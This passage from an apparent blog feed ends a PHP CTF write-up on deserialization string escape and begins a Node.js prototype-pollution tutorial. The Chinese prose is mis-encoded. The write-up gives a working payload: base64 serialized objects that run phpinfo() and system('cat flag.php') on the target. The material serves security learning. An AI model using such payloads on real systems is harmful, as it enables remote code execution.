class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEwOiJwaHBpbmZvKCk7Ijt9fX0=</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>æ‹¼å‡‘è¦é€ƒé€¸çš„å­—ç¬¦ä¸²ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;s:160:&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEwOiJwaHBpbmZvKCk7Ijt9fX0=&quot;;s:2:&quot;ob&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// æŸ¥è¯¢é•¿åº¦ä¸º220</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">220</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">// ç”Ÿæˆæ•°é‡ä¸€è‡´çš„hackerç”¨æ¥å­—ç¬¦ä¸²é€ƒé€¸</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†ä¸Šé¢ä¸¤ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;s:160:&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEwOiJwaHBpbmZvKCk7Ijt9fX0=&quot;;s:2:&quot;ob&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸï¼Œé¡µé¢æ˜¾ç¤ºphpinfoé¡µé¢ï¼Œé€šè¿‡æ›´æ”¹cmdçš„å€¼ï¼Œé‡å¤ä¸Šè¿°æ“ä½œï¼Œå³å¯è·å¾—flag</p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:5:&quot;</span>UUCTF<span class="string">&quot;;s:8:&quot;</span>basedata<span class="string">&quot;;s:176:&quot;</span>Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oJ2NhdCBmbGFnLnBocCcpOyI7fX19<span class="string">&quot;;s:2:&quot;</span>ob<span class="string">&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼Œå¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NodejsåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2023/08/03/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/08/03/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="NodejsåŸºç¡€"><a href="#NodejsåŸºç¡€" class="headerlink" title="NodejsåŸºç¡€"></a>NodejsåŸºç¡€</h1><blockquote><p>ç®€å•çš„è¯´ Node.js å°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptã€‚<br>Node.js æ˜¯ä¸€ä¸ªåŸºäºChrome JavaScript è¿è¡Œæ—¶å»ºç«‹çš„ä¸€ä¸ªå¹³å°ã€‚<br>Node.jsæ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨I/OæœåŠ¡ç«¯JavaScriptç¯å¢ƒï¼ŒåŸºäºGoogleçš„V8å¼•æ“ï¼ŒV8å¼•æ“æ‰§è¡ŒJavascriptçš„é€Ÿåº¦éå¸¸å¿«ï¼Œæ€§èƒ½éå¸¸å¥½ã€‚</p><p>node.js å…è®¸ç”¨æˆ·ä»NPMæœåŠ¡å™¨ä¸‹è½½åˆ«äººç¼–å†™çš„ç¬¬ä¸‰æ–¹åŒ…åˆ°æœ¬åœ°ä½¿ç”¨</p></blockquote><p>è¿™å°±åƒpython ä¸€æ ·pipä¸‹è½½åŒ…ä»¥åï¼Œé€šè¿‡importå¼•å…¥ï¼Œè€Œnode.jsæ˜¯é€šè¿‡requireå¼•å…¥çš„</p><h2 id="ç±»ä¸æ„é€ å‡½æ•°-constructor"><a href="#ç±»ä¸æ„é€ å‡½æ•°-constructor" class="headerlink" title="ç±»ä¸æ„é€ å‡½æ•°(constructor)"></a>ç±»ä¸æ„é€ å‡½æ•°(constructor)</h2><p>JavaScriptä¸­ï¼Œæˆ‘ä»¬å¦‚æœè¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä»¥<strong>å®šä¹‰â€œæ„é€ å‡½æ•°â€çš„æ–¹å¼</strong>æ¥å®šä¹‰ï¼š </p><p> ä¸€ä¸ªç±»å¿…ç„¶æœ‰ä¸€äº›æ–¹æ³•ï¼Œç±»ä¼¼å±æ€§<code>this.bar</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼š </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šæ®µä»£ç ï¼š<code>Foo</code>å‡½æ•°çš„å†…å®¹ï¼Œå°±æ˜¯<code>Foo</code>ç±»çš„æ„é€ å‡½æ•°ï¼Œè€Œ<code>this.bar</code>å°±æ˜¯<code>Foo</code>ç±»çš„ä¸€ä¸ªå±æ€§ã€‚ </p><p> è¿™æ®µä»£ç åŠŸèƒ½å°±æ˜¯ å®šä¹‰ä¸€ä¸ªFooç±»ï¼Œè°ƒç”¨Fooç±»çš„showæ–¹æ³•ï¼Œä¼šè¾“å‡ºå®ƒçš„ bar å±æ€§</p><h2 id="åŒæ­¥å’Œå¼‚æ­¥"><a href="#åŒæ­¥å’Œå¼‚æ­¥" class="headerlink" title="åŒæ­¥å’Œå¼‚æ­¥"></a>åŒæ­¥å’Œå¼‚æ­¥</h2><blockquote><p>Node.js æ–‡ä»¶ç³»ç»Ÿï¼ˆfs æ¨¡å—ï¼‰æ¨¡å—ä¸­çš„æ–¹æ³•å‡æœ‰å¼‚æ­¥å’ŒåŒæ­¥ç‰ˆæœ¬ï¼Œä¾‹å¦‚è¯»å–æ–‡ä»¶å†…å®¹çš„å‡½æ•°æœ‰å¼‚æ­¥çš„ fs.readFile() å’ŒåŒæ­¥çš„ fs.readFileSync()ã€‚<br>å¼‚æ­¥çš„æ–¹æ³•å‡½æ•°æœ€åä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œå›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åŒ…å«äº†é”™è¯¯ä¿¡æ¯(error)ã€‚</p></blockquote><p>è§£é‡ŠåŒæ­¥å’Œå¼‚æ­¥ï¼š</p><ul><li>å½“ä½ å…ˆè¯»å–æ–‡ä»¶ï¼Œè¾“å‡ºå…¶å†…å®¹åï¼Œåˆè¾“å‡ºä¸€æ®µè¯çš„æ—¶å€™</li><li>åŒæ­¥ï¼šå…ˆè¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œå†è¾“å‡ºä¸€æ®µè¯</li><li>å¼‚æ­¥ï¼šå…ˆè¾“å‡ºä¸€æ®µè¯ï¼Œåè¾“å‡ºæ–‡ä»¶å†…å®¹</li></ul><h2 id="fsæ¨¡å—"><a href="#fsæ¨¡å—" class="headerlink" title="fsæ¨¡å—"></a>fsæ¨¡å—</h2><p>node.jsçš„æ–‡ä»¶æ“ä½œæ¨¡å—ï¼Œæˆ‘ä»¬æœ¬åœ°å»ºç«‹ä¸€ä¸ªtest.txtï¼Œå†…å®¹ä¸º123456</p><p>å®ƒçš„åŒæ­¥å‡½æ•°ï¼š<code>readFileSync</code>ï¼Œå¼‚æ­¥å‡½æ•°ï¼š<code>readFile</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å¼‚æ­¥è¯»å–</span></span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;sd.txt&#x27;</span>, <span class="keyword">function</span> (<span class="params">err, data</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> (err) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¼‚æ­¥è¯»å–: &quot;</span> + data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åŒæ­¥è¯»å–</span></span><br><span class="line"><span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;test.txt&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;åŒæ­¥è¯»å–: &quot;</span> + data.<span class="title function_">toString</span>());</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•ã€‚&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è¾“å‡ºç»“æœï¼š</span></span><br><span class="line"><span class="comment">åŒæ­¥è¯»å–: 123456</span></span><br><span class="line"><span class="comment">ç¨‹åºæ‰§è¡Œå®Œæ¯•ã€‚</span></span><br><span class="line"><span class="comment">å¼‚æ­¥è¯»å–: 123456</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="child-processæ¨¡å—"><a href="#child-processæ¨¡å—" class="headerlink" title="child_processæ¨¡å—"></a>child_processæ¨¡å—</h2><p><code>child_process</code>æä¾›äº†å‡ ç§åˆ›å»ºå­è¿›ç¨‹çš„æ–¹å¼</p><blockquote><p>å¼‚æ­¥æ–¹å¼ï¼šspawnã€execã€execFileã€fork<br>åŒæ­¥æ–¹å¼ï¼šspawnSyncã€execSyncã€execFileSync<br>åœ¨å¼‚æ­¥åˆ›å»ºè¿›ç¨‹æ—¶ï¼Œspawnæ˜¯åŸºç¡€ï¼Œå…¶ä»–çš„forkã€execã€execFileéƒ½æ˜¯åŸºäºspawnæ¥ç”Ÿæˆçš„ã€‚<br>åŒæ­¥åˆ›å»ºè¿›ç¨‹å¯ä»¥ä½¿ç”¨child_process.spawnSync()ã€child_process.execSync() å’Œ child_process.execFileSync() ï¼ŒåŒæ­¥çš„æ–¹æ³•ä¼šé˜»å¡ Node.js äº‹ä»¶å¾ªç¯ã€æš‚åœä»»ä½•å…¶ä»–ä»£ç çš„æ‰§è¡Œï¼Œç›´åˆ°å­è¿›ç¨‹é€€å‡ºã€‚</p></blockquote><p>å…¶ä¸­çš„ä¸€äº›å‡½æ•°ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œå¯ä»¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œ</p><h1 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h1><h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h2><p>åœ¨JavaScriptä¸­ï¼Œprototypeå¯¹è±¡æ˜¯å®ç°é¢å‘å¯¹è±¡çš„ä¸€ä¸ªé‡è¦æœºåˆ¶ã€‚</p><p>å®ƒæ˜¯å‡½æ•°æ‰€ç‹¬æœ‰çš„ï¼Œå®ƒæ˜¯ä»ä¸€ä¸ªå‡½æ•°æŒ‡å‘ä¸€ä¸ªå¯¹è±¡</p><p>å®ƒçš„å«ä¹‰æ˜¯å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°(constructor)æ‰€åˆ›å»ºçš„å®ä¾‹çš„åŸå‹å¯¹è±¡</p><p>ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼Œå¦‚æœè‡ªå·±æ²¡æœ‰çš„å±æ€§prototypeæœ‰ï¼Œå°±ä¼šç»§æ‰¿æ­¤å±æ€§ï¼Œæœ‰çš„è¯åˆ™ä¸ä¼šè¦†ç›–ã€‚</p><p>ä¾‹å¦‚çœ‹ä¸‹é¢è¿™æ®µjsä»£ç ï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure></p><p>å¯ä¸€çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡prototypeå±æ€§ï¼ŒæŒ‡å‘åˆ°è¿™ä¸ªå‡½æ•°çš„<strong>åŸå‹å¯¹è±¡ä¸­</strong>ç„¶ååˆ›å»ºä¸€ä¸ª<code>show()</code>å‡½æ•°ï¼ŒåŠŸèƒ½ä¸ºè¾“å‡º<code>this.bar</code></p><blockquote><p>æˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹ prototypeæ˜¯ç±»Fooçš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨Fooç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œ</p><p>åŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„fooå¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰foo.show()æ–¹æ³•ã€‚</p></blockquote><h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a>__proto__</h2><blockquote><p> å¦‚ä¸Šé¢æ‰€è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Foo.prototypeæ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä½†Fooå®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚</p></blockquote><p>ä¸åŒäºprototypeæ˜¯å‡½æ•°ç‰¹æœ‰çš„ï¼Œå®ƒæ˜¯<strong>å¯¹è±¡æ‰€ç‹¬æœ‰çš„</strong>ï¼Œ<strong>proto</strong>å±æ€§éƒ½æ˜¯ç”±<strong>ä¸€ä¸ªå¯¹è±¡æŒ‡å‘ä¸€ä¸ªå¯¹è±¡</strong>ï¼Œ</p><p><strong>å³æŒ‡å‘å®ƒä»¬çš„åŸå‹å¯¹è±¡ï¼ˆä¹Ÿå¯ä»¥ç†è§£ä¸ºçˆ¶å¯¹è±¡ï¼‰</strong></p><blockquote><p>ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„fooå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡foo.<strong>proto</strong>å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p><p><code>foo.__proto__ === Foo.prototype (True)</code></p><p>å³ï¼š</p><p>prototypeæ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>ä¸€ä¸ªå¯¹è±¡çš„<strong>proto</strong>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„prototypeå±æ€§</p></blockquote><h2 id="prototypeä¸-proto-çš„å…³ç³»"><a href="#prototypeä¸-proto-çš„å…³ç³»" class="headerlink" title="prototypeä¸__proto__çš„å…³ç³»"></a>prototypeä¸__proto__çš„å…³ç³»</h2><p><img src="/img/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/nodejs_03.png" alt=""></p><h2 id="åŸå‹é“¾çš„ç»§æ‰¿æ€æƒ³"><a href="#åŸå‹é“¾çš„ç»§æ‰¿æ€æƒ³" class="headerlink" title="åŸå‹é“¾çš„ç»§æ‰¿æ€æƒ³"></a>åŸå‹é“¾çš„ç»§æ‰¿æ€æƒ³</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure><p>Sonç±»ç»§æ‰¿äº†Fatherç±»çš„<code>last_name</code>å±æ€§ï¼Œæœ€åè¾“å‡ºçš„æ˜¯<code>Name: Melania Trump</code></p><p><img src="/img/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/nodejs.png" alt=""></p><blockquote><p>æ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºå¯¹è±¡sonï¼Œåœ¨console.log() è°ƒç”¨son.last_nameçš„æ—¶å€™ï¼Œå®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><p>åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last<em>name<br>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨son.<strong>proto</strong>ä¸­å¯»æ‰¾last<em>name<br>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨son.<strong>proto</strong>.<strong>proto</strong>ä¸­å¯»æ‰¾last_name<br>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°nullç»“æŸã€‚æ¯”å¦‚ï¼ŒObject.prototypeçš„__proto</em></em>å°±æ˜¯null</p></blockquote><p>ç±»ä¼¼äºJavaé‡Œé¢ç»§æ‰¿çš„æ€æƒ³ï¼Œå¦‚æœå­ç±»æ²¡æœ‰è¿™ä¸ªå±æ€§, å¾€ä¸Šç»§æ‰¿çˆ¶ç±». æœ‰çš„è¯å°±è‡ªå·±ç”¨è‡ªå·±çš„</p><p> JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾</p><ul><li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li><li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡prototype</li><li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li></ul><h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h1><h2 id="ç®€å•ä»‹ç»"><a href="#ç®€å•ä»‹ç»" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h2><ul><li>åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>__proto__</code>å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®å¾—åˆ°æŸä¸€å®ä¾‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.<span class="property">__proto__</span></span><br><span class="line">objectname.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure><ul><li>ä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object.prototype</span></span><br><span 